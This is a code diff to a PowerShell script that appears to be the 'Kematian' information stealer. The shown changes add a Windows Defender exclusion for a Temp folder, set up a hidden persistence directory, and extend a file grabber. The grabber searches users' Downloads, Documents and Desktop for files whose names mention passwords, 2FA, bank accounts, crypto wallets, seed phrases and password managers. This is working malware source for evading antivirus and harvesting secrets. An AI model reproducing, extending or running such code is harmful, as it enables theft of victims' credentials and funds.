@@ -87,6 +87,7 @@ function CHECK_AND_PATCH {
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
     if ($persistence) {
+		Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
         Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
         New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force | Out-Null
         # Hidden Directory
@@ -749,7 +750,7 @@ Pass: $decodedPass
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
-        $keywords = @("2fa", "account", "auth", "backup", "bank", "bitcoin", "binance", "btc", "backup", "bitwarden", "code", "casino", "coinbase", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "kraken", "kucoin", "keepass", "keys", "lastpass", "login", "ledger", "mail", "memo", "mnemonic", "metamask", "note", "nordpass", "pass", "paypal", "pw", "recovery", "remote", "secret", "skrill", "pgp", "private", "passphrase", "seedphrase", "server", "solana", "syncthing", "trading", "token", "trezor", "tether", "venmo", "wallet")
+        $keywords = @("2fa","account","auth","backup","bank","binance","bitcoin","bitwarden","btc","casino","code","coinbase ","crypto","dashlane","discord","eth","exodus","facebook","funds","info","keepass","keys","kraken","kucoin","lastpass","ledger","login","mail","memo","metamask","mnemonic","nordpass","note","pass","passphrase","paypal","pgp","private","pw","recovery","remote","roboform","secret","seedphrase","server","skrill","smtp","solana","syncthing","tether","token","trading","trezor","venmo","vault","wallet")
         $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
         foreach ($path in $paths) {
             $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
